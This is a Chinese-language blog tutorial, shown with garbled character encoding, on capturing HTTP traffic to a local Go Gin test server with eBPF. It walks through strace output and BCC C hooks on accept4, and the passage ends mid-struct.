    <content type="html"><![CDATA[<h4 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h4><p>å°±ç›®å‰è€Œè¨€ï¼Œtcpdumpæ˜¯æ•è·ç”Ÿäº§ä¸­æµé‡æœ€å¸¸è§çš„è§£å†³æ–¹æ¡ˆä¹‹ä¸€ã€‚ä½†æ˜¯ç¼ºç‚¹æ˜¯å®ƒä¸å…è®¸åº”ç”¨ç¨‹åºçº§åˆ«çš„è¿‡æ»¤(L7è¿‡æ»¤)ï¼Œå› æ­¤æ¯å½“æ•è·ç›¸å…³çš„HTTPä¼šè¯æ—¶ï¼Œæœ€ç»ˆéœ€è¦å­˜å‚¨æ•°ç™¾å…†å­—èŠ‚çš„æµé‡é€šè¿‡ã€‚å¦ä¸€ç§è§£å†³æ–¹æ¡ˆæ˜¯åœ¨æºä»£ç ä¸­æ·»åŠ ä¸€ä¸ªç®—æ³•æ¥æŸ¥æ‰¾ç›¸å…³çš„HTTPä¼šè¯ï¼Œä½†è¿™éœ€è¦åœ¨ç”Ÿäº§ä¸­è¿›è¡Œä»£ç æ£€æµ‹ï¼Œå¹¶ä¸”æ— æ³•è¾¾åˆ°éä¾µå…¥å¼å¯è§‚æµ‹æ€§ã€‚</p><p>eBPFåº”è¿è€Œç”Ÿã€‚eBPFæ˜¯Linuxåº”ç”¨ç¨‹åºåœ¨Linuxå†…æ ¸ç©ºé—´æ‰§è¡Œä»£ç çš„ä¸€ç§æœºåˆ¶ã€‚ä½¿ç”¨eBPFå®ç°æµé‡æ•è·è¿œè¿œè¶…å‡ºä¸€äº›æ ‡å‡†çš„è§£å†³æ–¹æ¡ˆ(WireSharkã€Fiddlerå’Œtcpdump)</p><p>eBPFå…è®¸æ·»åŠ å¤šä¸ªè¿‡æ»¤å±‚å¹¶ç›´æ¥ä»å†…æ ¸æ•è·æµé‡ï¼Œä»è€Œæ˜¾è‘—å‡å°‘ç›¸å…³æ•°æ®çš„è¾“å‡ºé‡ï¼Œå¹¶ç¡®ä¿å¯ä»¥é«˜ååé‡çš„å¤„ç†åº”ç”¨ç¨‹åºæµé‡ã€‚</p><h4 id="å®éªŒç¯å¢ƒ"><a href="#å®éªŒç¯å¢ƒ" class="headerlink" title="å®éªŒç¯å¢ƒ"></a>å®éªŒç¯å¢ƒ</h4><ul><li>Ubuntu20.04</li><li>BCC v0.21.0 </li><li>GO v1.19</li></ul><h4 id="è¯·æ±‚æµç¨‹åˆ†æ"><a href="#è¯·æ±‚æµç¨‹åˆ†æ" class="headerlink" title="è¯·æ±‚æµç¨‹åˆ†æ"></a>è¯·æ±‚æµç¨‹åˆ†æ</h4><p>é¦–å…ˆé€šè¿‡GOçš„Ginæ¡†æ¶æ­å»ºä¸€ä¸ªç®€å•çš„HTTPæœåŠ¡å™¨ã€‚æºç å¦‚ä¸‹</p><p><code>server.go</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"fmt"</span></span><br><span class="line"><span class="string">"log"</span></span><br><span class="line"><span class="string">"math/rand"</span></span><br><span class="line"><span class="string">"net/http"</span></span><br><span class="line"><span class="string">"os"</span></span><br><span class="line"><span class="string">"time"</span></span><br><span class="line"></span><br><span class="line"><span class="string">"github.com/gin-gonic/gin"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">defaultPort    = <span class="string">"8080"</span></span><br><span class="line">maxPayloadSize = <span class="number">10</span> * <span class="number">1024</span> * <span class="number">1024</span> <span class="comment">// 10 MB</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line"><span class="comment">// source is a static, global rand object.</span></span><br><span class="line">source      *rand.Rand</span><br><span class="line">letterBytes = <span class="string">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890~!@#$"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">randStringBytes</span><span class="params">(n <span class="keyword">int</span>)</span> <span class="title">string</span></span> &#123;</span><br><span class="line">b := <span class="built_in">make</span>([]<span class="keyword">byte</span>, n)</span><br><span class="line"><span class="keyword">for</span> i := <span class="keyword">range</span> b &#123;</span><br><span class="line">b[i] = letterBytes[source.Intn(<span class="built_in">len</span>(letterBytes))]</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">string</span>(b)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">init</span><span class="params">()</span></span> &#123;</span><br><span class="line">source = rand.New(rand.NewSource(time.Now().UnixNano()))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// customResponse holds the requested size for the response payload.</span></span><br><span class="line"><span class="keyword">type</span> customResponse <span class="keyword">struct</span> &#123;</span><br><span class="line">Size <span class="keyword">int</span> <span class="string">`json:"size"`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">postCustomResponse</span><span class="params">(context *gin.Context)</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> customResp customResponse</span><br><span class="line"><span class="keyword">if</span> err := context.BindJSON(&amp;customResp); err != <span class="literal">nil</span> &#123;</span><br><span class="line">_ = context.AbortWithError(http.StatusBadRequest, err)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> customResp.Size &gt; maxPayloadSize &#123;</span><br><span class="line">_ = context.AbortWithError(http.StatusBadRequest, fmt.Errorf(<span class="string">"requested size %d is bigger than max allowed %d"</span>, customResp, maxPayloadSize))</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">context.JSON(http.StatusOK, <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">string</span>&#123;<span class="string">"answer"</span>: randStringBytes(customResp.Size)&#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">engine := gin.New()</span><br><span class="line"></span><br><span class="line">engine.Use(gin.Recovery())</span><br><span class="line">engine.POST(<span class="string">"/customResponse"</span>, postCustomResponse)</span><br><span class="line"></span><br><span class="line">port := os.Getenv(<span class="string">"PORT"</span>)</span><br><span class="line"><span class="keyword">if</span> port == <span class="string">""</span> &#123;</span><br><span class="line">port = defaultPort</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fmt.Printf(<span class="string">"listening on 0.0.0.0:%s\n"</span>, port)</span><br><span class="line"><span class="keyword">if</span> err := engine.Run(fmt.Sprintf(<span class="string">"0.0.0.0:%s"</span>, port)); err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatal(err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œä»£ç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/home/caoyifan/eBPF-Sniffer# go run server.go</span><br><span class="line">server.go:11:2: no required module provides package github.com/gin-gonic/gin; to add it:</span><br><span class="line">go get github.com/gin-gonic/gin</span><br></pre></td></tr></table></figure><p>å¦‚ä¸Šå› ä¸ºæ²¡æœ‰å®‰è£…ginæ¡†æ¶ï¼Œå› æ­¤æˆ‘ä»¬å…ˆå®‰è£…ginæ¡†æ¶ã€‚ä¿®æ”¹ä»£ç†åä½¿ç”¨<code>go get</code>å‘½ä»¤</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">export GOPROXY="https://goproxy.cn"</span><br><span class="line">go mod init xx</span><br><span class="line">go mod tidy</span><br></pre></td></tr></table></figure><p>ä¸‹è½½å®Œæˆåè¿è¡ŒserveræœåŠ¡</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/home/caoyifan/eBPF-Sniffer# go run server.go</span><br><span class="line">[GIN-debug] [WARNING] Running in "debug" mode. Switch to "release" mode in production.</span><br><span class="line"> - using env:export GIN_MODE=release</span><br><span class="line"> - using code:gin.SetMode(gin.ReleaseMode)</span><br><span class="line"></span><br><span class="line">[GIN-debug] POST   /customResponse           --&gt; main.postCustomResponse (2 handlers)</span><br><span class="line">listening on 0.0.0.0:8080</span><br><span class="line">[GIN-debug] [WARNING] You trusted all proxies, this is NOT safe. We recommend you to set a value.</span><br><span class="line">Please check https://pkg.go.dev/github.com/gin-gonic/gin#readme-don-t-trust-all-proxies for details.</span><br><span class="line">[GIN-debug] Listening and serving HTTP on 0.0.0.0:8080</span><br></pre></td></tr></table></figure><p>æœ¬åœ°å‘é€POSTè¯·æ±‚ï¼ŒæœåŠ¡å™¨æ¥æ”¶åˆ°POSTè¯·æ±‚åä¼šå“åº”éšæœºç”Ÿæˆçš„Payloadã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/home/caoyifan# curl -X POST http://localhost:8080/customResponse -d '&#123;"size": 100&#125;'</span><br><span class="line">&#123;"answer":"Gs#UjI7u2kiOmSyJDkw7JAi3Y~Z4fauPaeThxct14qoweIUdiwDsB#9PUuvPgayVGfXQcc$E9itK1tlo5twE$cuGRvge4S~H2cS6"&#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœæˆ‘ä»¬éœ€è¦é€šè¿‡eBPFå»æ•è·å®Œæ•´çš„HTTPè¯·æ±‚ï¼Œç¬¬ä¸€æ­¥éœ€è¦äº†è§£åˆ°æœ¬æ¬¡è¯·æ±‚ä½¿ç”¨äº†å“ªäº›ç³»ç»Ÿè°ƒç”¨ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>strace</code>å·¥å…·è¿›è¡ŒæŸ¥çœ‹ã€‚</p><p>é€šè¿‡å¦‚ä¸‹å‘½ä»¤è¿è¡ŒserveræœåŠ¡</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo strace -f -o syscalls_dump.txt go run server.go</span><br></pre></td></tr></table></figure><ul><li><code>-f</code>ï¼šä»æœåŠ¡å™¨çš„çº¿ç¨‹ä¸­æ•è·ç³»ç»Ÿè°ƒç”¨</li><li><code>-o</code>ï¼šå°†ç»“æœå†™å…¥åˆ°æ–‡ä»¶ä¸­</li></ul><p>æ¥ç€å†æ¬¡è¿è¡Œä¸Šè¿°POSTè¯·æ±‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/home/caoyifan# curl -X POST http://localhost:8080/customResponse -d '&#123;"size": 100&#125;'</span><br><span class="line">&#123;"answer":"Gs#UjI7u2kiOmSyJDkw7JAi3Y~Z4fauPaeThxct14qoweIUdiwDsB#9PUuvPgayVGfXQcc$E9itK1tlo5twE$cuGRvge4S~H2cS6"&#125;</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹<code>syscalls_dump.txt</code>æ–‡ä»¶</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">2507558 accept4(3,  &lt;unfinished ...&gt;</span><br><span class="line">2507562 epoll_pwait(4,  &lt;unfinished ...&gt;</span><br><span class="line">2507559 nanosleep(&#123;tv_sec=0, tv_nsec=20000&#125;,  &lt;unfinished ...&gt;</span><br><span class="line">2507558 &lt;... accept4 resumed&gt; 0xc00031fa28, [112], SOCK_CLOEXEC|SOCK_NONBLOCK) = -1 EAGAIN (Resource temporarily unavailable)</span><br><span class="line">2507562 &lt;... epoll_pwait resumed&gt; [&#123;EPOLLIN|EPOLLOUT, &#123;u32=3021211368, u64=140633135384296&#125;&#125;], 128, 0, NULL, 0) = 1</span><br><span class="line">2507562 epoll_pwait(4,  &lt;unfinished ...&gt;</span><br><span class="line">2507559 &lt;... nanosleep resumed&gt; NULL)   = 0</span><br><span class="line">2507559 nanosleep(&#123;tv_sec=0, tv_nsec=20000&#125;,  &lt;unfinished ...&gt;</span><br><span class="line">2507558 read(7, "POST /customResponse HTTP/1.1\r\nH"..., 4096) = 175</span><br><span class="line">2507558 write(7, "HTTP/1.1 200 OK\r\nContent-Type: a"..., 237 &lt;unfinished ...&gt;</span><br><span class="line">2507559 &lt;... nanosleep resumed&gt; NULL)   = 0</span><br><span class="line">2507559 nanosleep(&#123;tv_sec=0, tv_nsec=20000&#125;, NULL) = 0</span><br><span class="line">2507558 futex(0xc000080148, FUTEX_WAKE_PRIVATE, 1 &lt;unfinished ...&gt;</span><br><span class="line">2507559 nanosleep(&#123;tv_sec=0, tv_nsec=20000&#125;,  &lt;unfinished ...&gt;</span><br><span class="line">2507558 &lt;... futex resumed&gt; )           = 1</span><br><span class="line">2507561 &lt;... futex resumed&gt; )           = 0</span><br><span class="line">2507559 &lt;... nanosleep resumed&gt; NULL)   = 0</span><br><span class="line">2507561 nanosleep(&#123;tv_sec=0, tv_nsec=3000&#125;,  &lt;unfinished ...&gt;</span><br><span class="line">2507559 nanosleep(&#123;tv_sec=0, tv_nsec=20000&#125;,  &lt;unfinished ...&gt;</span><br><span class="line">2507561 &lt;... nanosleep resumed&gt; NULL)   = 0</span><br><span class="line">2507559 &lt;... nanosleep resumed&gt; NULL)   = 0</span><br><span class="line">....</span><br><span class="line">2507558 close(7 &lt;unfinished ...&gt;</span><br></pre></td></tr></table></figure><p>é€šè¿‡ä¸Šè¿°æ–‡ä»¶å¯ä»¥çœ‹åˆ°ã€‚æœåŠ¡å™¨é¦–å…ˆä½¿ç”¨<code>accept4</code>ç³»ç»Ÿè°ƒç”¨æ¥æ¥å—ä¸€ä¸ªæ–°çš„è¿æ¥ã€‚æ•´ä¸ªè¯·æ±‚æœåŠ¡å™¨çš„è°ƒç”¨æµç¨‹å¦‚ä¸‹ï¼š</p><ul><li><code>accept4</code>ï¼šä½¿ç”¨ç³»ç»Ÿè°ƒç”¨æ¥å—æ–°è¿æ¥</li><li><code>read</code>ï¼šä½¿ç”¨å¥—æ¥å­—æ–‡ä»¶æè¿°ç¬¦(fd)ä¸Šçš„ç³»ç»Ÿè°ƒç”¨ä»å¥—æ¥å­—è¯»å–å†…å®¹</li><li><code>write</code>ï¼šä½¿ç”¨å¥—æ¥å­—æ–‡ä»¶æè¿°ç¬¦(fd)ä¸Šçš„ç³»ç»Ÿè°ƒç”¨å°†å“åº”å†™å…¥å¥—æ¥å­—</li><li><code>close</code>ï¼šä½¿ç”¨ç³»ç»Ÿè°ƒç”¨å…³é—­æ–‡ä»¶æè¿°ç¬¦</li></ul><h4 id="å†…æ ¸ä»£ç†eBPFå®ç°"><a href="#å†…æ ¸ä»£ç†eBPFå®ç°" class="headerlink" title="å†…æ ¸ä»£ç†eBPFå®ç°"></a>å†…æ ¸ä»£ç†eBPFå®ç°</h4><p>æˆ‘ä»¬éœ€è¦é€šè¿‡eBPF hook 8ä¸ªé’©å­ï¼Œåˆ†åˆ«æ˜¯<code>accept4ã€readã€writeã€close</code>çš„è¿›å…¥å’Œé€€å‡ºé’©å­ã€‚ç¨‹åºé€šè¿‡Cè¯­è¨€ç¼–å†™ï¼Œæˆ‘ä»¬ä¼šé€šè¿‡æ‰€æœ‰çš„é’©å­ç»„åˆæ¥æ‰§è¡Œå®Œæ•´çš„æ•è·è¿‡ç¨‹ã€‚</p><p>åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼ŒeBPFç¨‹åºç”±æ‰§è¡Œhookçš„å†…æ ¸ä»£ç†å’Œå¤„ç†ä»å†…æ ¸å‘é€çš„äº‹ä»¶çš„ç”¨æˆ·ä»£ç†ç»„æˆã€‚åœ¨ä¸€äº›å…¶ä»–ç”¨ä¾‹ä¸­ï¼Œå¯èƒ½åªæœ‰å†…æ ¸ä»£ç†ï¼ˆå¦‚é˜»æ­¢æ¶æ„æµé‡çš„é˜²ç«å¢™ï¼‰</p><p>é¦–å…ˆæˆ‘ä»¬éœ€è¦æŒ‚è½½<code>accept4</code>ç³»ç»Ÿè°ƒç”¨ã€‚åœ¨eBPFç¨‹åºä¸­ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨æ¯ä¸ªç³»ç»Ÿè°ƒç”¨çš„è¿›å…¥å’Œé€€å‡ºæ”¾ç½®é’©å­ã€‚è¿™å¯¹äºè·å–ç³»ç»Ÿè°ƒç”¨çš„è¾“å…¥å‚æ•°å¾ˆæœ‰ç”¨ã€‚</p><p>åœ¨å¦‚ä¸‹ä»£ç ç‰‡æ®µä¸­ï¼Œæˆ‘ä»¬å£°æ˜ç»“æ„ä½“ä»¥å°†ç³»ç»Ÿè°ƒç”¨çš„è¾“å…¥å‚æ•°ä¿å­˜åœ¨ç³»ç»Ÿè°ƒç”¨çš„å…¥å£ä¸­ï¼Œå¹¶åœ¨<code>accept4</code>ç³»ç»Ÿè°ƒç”¨çš„å‡ºå£å¤„ä½¿ç”¨ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ä¿å­˜ç³»ç»Ÿè°ƒç”¨çš„addrå‚æ•°ç»“æ„</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">accept_args_t</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span>* <span class="title">addr</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// mapæ˜ å°„ï¼Œåœ¨å…¥å£å’Œè¿”å›é’©å­ä¹‹é—´ç¼“å­˜æ¥å—ç³»ç»Ÿè°ƒç”¨çš„è¾“å…¥å‚æ•°</span></span><br><span class="line">BPF_HASH(active_accept_args_map, <span class="keyword">uint64_t</span>, struct <span class="keyword">accept_args_t</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Hooking the entry of accept4</span></span><br><span class="line"><span class="comment">// the signature of the syscall is int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">syscall__probe_entry_accept4</span><span class="params">(struct pt_regs* ctx, <span class="keyword">int</span> sockfd, struct sockaddr* addr, <span class="keyword">socklen_t</span>* addrlen)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// è·å–ç›¸å…³pidä¸­çº¿ç¨‹å”¯ä¸€idï¼Œè¿™æ ·å¯ä»¥é“¾æ¥åŒä¸€çº¿ç¨‹çš„ä¸åŒè°ƒç”¨ã€‚</span></span><br><span class="line">    <span class="keyword">uint64_t</span> id = bpf_get_current_pid_tgid();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å°†addrä¿å­˜åœ¨mapä¸­ï¼Œæ–¹ä¾¿accept4é€€å‡ºæ—¶ä½¿ç”¨</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">accept_args_t</span> <span class="title">accept_args</span> = &#123;</span>&#125;;</span><br><span class="line">    accept_args.addr = (struct sockaddr_in *)addr;</span><br><span class="line">    active_accept_args_map.update(&amp;id, &amp;accept_args);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Hooking the exit of accept4</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">syscall__probe_ret_accept4</span><span class="params">(struct pt_regs* ctx)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> id = bpf_get_current_pid_tgid();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä»mapä¸­è·å–addr</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">accept_args_t</span>* <span class="title">accept_args</span> = <span class="title">active_accept_args_map</span>.<span class="title">lookup</span>(&amp;<span class="title">id</span>);</span></span><br><span class="line">    <span class="comment">// å¦‚æœmapæ˜ å°„ä¸­å­˜åœ¨ idï¼Œæˆ‘ä»¬å°†è·å¾—ä¸€ä¸ªéç©ºæŒ‡é’ˆï¼Œè¯¥æŒ‡é’ˆä¿å­˜æ¥è‡ªç³»ç»Ÿè°ƒç”¨æ¡ç›®çš„è¾“å…¥åœ°å€å‚æ•°ã€‚</span></span><br><span class="line">    <span class="keyword">if</span> (accept_args != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        process_syscall_accept(ctx, id, accept_args);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æœ€åæ¸…ç†map</span></span><br><span class="line">    active_accept_args_map.<span class="keyword">delete</span>(&amp;id);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç”±äºåœ¨ç³»ç»Ÿè°ƒç”¨è¿›å…¥æœŸé—´æˆ‘ä»¬æ— æ³•çŸ¥é“ç³»ç»Ÿè°ƒç”¨æ˜¯å¦ä¼šæˆåŠŸï¼Œå¹¶ä¸”åœ¨ç³»ç»Ÿè°ƒç”¨é€€å‡ºæœŸé—´æˆ‘ä»¬æ— æ³•è®¿é—®è¾“å…¥å‚æ•°ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦å­˜å‚¨å‚æ•°ã€‚è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨çš„é€»è¾‘æ˜¯<code>process_syscall_accept</code>ï¼Œè¯¥å‡½æ•°ä¼šæ£€æŸ¥ç³»ç»Ÿè°ƒç”¨æ˜¯å¦æˆåŠŸå®Œæˆï¼Œç„¶åæˆ‘ä»¬ä¼šå°†é“¾æ¥ä¿¡æ¯ä¿å­˜åœ¨å…¨å±€mapä¸­ï¼Œä»¥ä¾¿åç»­çš„ç³»ç»Ÿè°ƒç”¨(readã€writeã€close)ä½¿ç”¨ã€‚</p><p>åœ¨ä¸‹é¢çš„ä»£ç ä¸­ï¼Œæˆ‘ä»¬åˆ›å»ºäº†<code>accept4</code>hookä½¿ç”¨çš„å‡½æ•°ã€‚å¹¶åœ¨æˆ‘ä»¬è‡ªå·±çš„mapæ˜ å°„ä¸­æ³¨å†Œåˆ°æœåŠ¡å™¨ä¸Šçš„ä»»ä½•æ–°çš„è¿æ¥ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ä¸€ä¸ªç»“æ„ä½“ï¼Œè¡¨ç¤ºç”± pidã€fdå’Œç»“æ„ä½“timestampç»„æˆçš„å”¯ä¸€IDã€‚</span></span><br><span class="line"><span class="comment">// descriptor and the creation time of the struct.</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">conn_id_t</span> &#123;</span></span><br><span class="line">    <span class="comment">// è¿›ç¨‹ID</span></span><br><span class="line">    <span class="keyword">uint32_t</span> pid;</span><br><span class="line">    <span class="comment">// æ‰“å¼€çš„ç½‘ç»œè¿æ¥çš„fd</span></span><br><span class="line">    <span class="keyword">int32_t</span> fd;</span><br><span class="line">    <span class="comment">// ç»“æ„ä½“åˆå§‹åŒ–æ—¶çš„æ—¶é—´æˆ³</span></span><br><span class="line">    <span class="keyword">uint64_t</span> tsid;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// è¯¥ç»“æ„åŒ…å«å»ºç«‹è¿æ¥æ—¶é€šè¿‡accept4() ç³»ç»Ÿè°ƒç”¨æ”¶é›†çš„ä¿¡æ¯ã€‚</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">conn_info_t</span> &#123;</span></span><br><span class="line">    <span class="comment">// è¿æ¥æ ‡è¯†ç¬¦</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">conn_id_t</span> <span class="title">conn_id</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// åœ¨æ­¤è¿æ¥ä¸Šå†™å…¥/è¯»å–çš„å­—èŠ‚æ•°</span></span><br><span class="line">    <span class="keyword">int64_t</span> wr_bytes;</span><br><span class="line">    <span class="keyword">int64_t</span> rd_bytes;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æŒ‡ç¤ºæˆ‘ä»¬å°†è¿æ¥è¯†åˆ«ä¸ºHTTPçš„æ ‡å¿—</span></span><br><span class="line">    <span class="keyword">bool</span> is_http;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å‘é€åˆ°ç”¨æˆ·ä»£ç†çš„äº‹ä»¶ç»“æ„</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">socket_open_event_t</span> &#123;</span></span><br><span class="line">    <span class="comment">// äº‹ä»¶å‘ç”Ÿçš„äº‹ä»¶</span></span><br><span class="line">    <span class="keyword">uint64_t</span> 